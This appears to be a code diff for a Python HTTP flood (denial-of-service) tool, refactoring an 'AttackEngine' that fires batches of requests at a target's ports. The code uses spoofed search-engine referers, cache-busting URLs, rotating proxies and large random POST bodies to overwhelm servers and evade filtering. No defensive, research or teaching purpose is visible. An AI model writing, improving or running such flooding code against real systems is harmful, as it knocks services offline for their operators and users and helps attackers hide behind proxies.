@@ -27,6 +27,8 @@ REF = ["https://google.com/search?q=", "https://bing.com/search?q=", "https://du
        "https://yandex.ru/search/?text=", "https://reddit.com/", "https://github.com/"]
 _c = string.ascii_letters + string.digits
 
+_JUNK = ["".join(random.choices(_c, k=10000)) for _ in range(20)]
+
 
 def _j(lo=3, hi=12):
     return "".join(random.choices(_c, k=random.randint(lo, hi)))
@@ -36,11 +38,8 @@ def _h():
             "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
             "Cache-Control": "no-cache", "Connection": "keep-alive"}
 
-# Pre-generated junk blocks for fat payloads (avoid per-request CPU burn)
-_JUNK_BLOCKS = ["".join(random.choices(_c, k=10000)) for _ in range(20)]
-
 def _p():
-    return {_j(5, 10): random.choice(_JUNK_BLOCKS)[:random.randint(5000, 10000)]
+    return {_j(5, 10): random.choice(_JUNK)[:random.randint(5000, 10000)]
             for _ in range(random.randint(2, 5))}
 
 def _m(m):
@@ -103,10 +102,7 @@ class AttackEngine:
         alive_ports = [p for p in ports if self.stats.ports[p].status == PortStatus.ALIVE]
         tpp = max(threads // max(len(alive_ports), 1), 100)
 
-        tasks = []
-        for p in ports:
-            tasks.append(asyncio.create_task(
-                self._port_loop(target, p, method, tpp, deadline, use_proxies)))
+        tasks = [asyncio.create_task(self._port_flood(target, p, method, tpp, deadline, use_proxies)) for p in ports]
         tasks.append(asyncio.create_task(self._health_loop(target)))
 
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -118,89 +114,79 @@ class AttackEngine:
                 self.stats.status = AttackStatus.FINISHED
         self.stats = self.stats.snapshot()
 
-    async def _port_loop(self, target, port, method, num_workers, deadline, use_proxies):
-        """Spawn N continuous workers + slowloris per port."""
+    async def _port_flood(self, target, port, method, threads, deadline, use_proxies):
         base = _url(target, port)
+        sem = asyncio.Semaphore(threads)
         d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
         p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
 
         d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
         d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
-        flood_count = num_workers
-
-        workers = []
-
-        # Ramp up flood workers in batches to avoid blocking the event loop
-        for i in range(flood_count):
-            use_px = use_proxies and (i % 10 >= 3)
-            workers.append(asyncio.create_task(
-                self._worker(d_session, base, port, method, deadline, use_px, p_timeout, i)))
-
-
         try:
-            await asyncio.gather(*workers, return_exceptions=True)
+            while not self._stop.is_set():
+                if deadline and time.time() >= deadline:
+                    break
+                ps = self.stats.ports.get(port)
+                if not ps or ps.status != PortStatus.ALIVE:
+                    await asyncio.sleep(0.5)
+                    continue
+
+                use_px = use_proxies and proxy_pool.alive_count > 100
+                batch = []
+                for _ in range(threads):
+                    if use_px and random.random() > 0.3:
+                        batch.append(self._px_req(base, port, method, sem, p_timeout))
+                    else:
+                        batch.append(self._direct_req(d_session, base, port, method, sem))
+                await asyncio.gather(*batch, return_exceptions=True)
+        except asyncio.CancelledError:
+            pass
+        except Exception as e:
+            self.last_error = f"Port {port}: {e}"
         finally:
             await d_session.close()
 
-    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout, worker_id=0):
-        """Single worker — fires continuously until stopped."""
-        # Stagger start: spread workers over 3 seconds
-        await asyncio.sleep(random.uniform(0, min(3.0, worker_id * 0.002)))
-
-        while not self._stop.is_set():
-            if deadline and time.time() >= deadline:
-                break
+    async def _direct_req(self, session, base, port, method, sem):
+        async with sem:
+            if self._stop.is_set():
+                return
             ps = self.stats.ports.get(port)
             if not ps or ps.status != PortStatus.ALIVE:
-                await asyncio.sleep(0.5)
-                continue
-
-            if use_px and proxy_pool.alive_count < 100:
-                use_px = False
-
+                return
+            m = _m(method)
+            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
+            if m == "POST":
+                kw["json"] = _p()
             try:
-                if use_px:
-                    await self._fire_proxy(base, port, method, p_timeout)
-                else:
-                    await self._fire_direct(d_session, base, port, method)
+                async with session.request(**kw) as resp:
+                    self._hit(ps, resp.status, resp.headers, True)
+            except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
+                self._miss(ps, True)
+
+    async def _px_req(self, base, port, method, sem, timeout):
+        async with sem:
+            if self._stop.is_set():
+                return
+            ps = self.stats.ports.get(port)
+            if not ps or ps.status != PortStatus.ALIVE:
+                return
+            px = proxy_pool.random()
+            if not px:
+                return
+            m = _m(method)
+            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
+            if m == "POST":
+                kw["json"] = _p()
+            try:
+                conn = ProxyConnector.from_url(px, ssl=False)
+                async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
+                    async with s.request(**kw) as resp:
+                        self._hit(ps, resp.status, resp.headers, False)
+                        proxy_pool.mark_alive(px)
             except Exception:
-                await asyncio.sleep(0.01)
-
-    async def _fire_direct(self, session, base, port, method):
-        ps = self.stats.ports.get(port)
-        if not ps:
-            return
-        m = _m(method)
-        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-        if m == "POST":
-            kw["json"] = _p()
-        try:
-            async with session.request(**kw) as resp:
-                self._hit(ps, resp.status, resp.headers, True)
-        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
-            self._miss(ps, True)
-
-    async def _fire_proxy(self, base, port, method, timeout):
-        ps = self.stats.ports.get(port)
-        if not ps:
-            return
-        px = proxy_pool.random()
-        if not px:
-            return
-        m = _m(method)
-        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-        if m == "POST":
-            kw["json"] = _p()
-        try:
-            conn = ProxyConnector.from_url(px, ssl=False)
-            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
-                async with s.request(**kw) as resp:
-                    self._hit(ps, resp.status, resp.headers, False)
-                    proxy_pool.mark_alive(px)
-        except Exception:
-            self._miss(ps, False)
-            proxy_pool.mark_dead(px)
+                self._miss(ps, False)
+                proxy_pool.mark_dead(px)
 
     def _hit(self, ps, status, headers, is_direct):
         ps.total_requests += 1
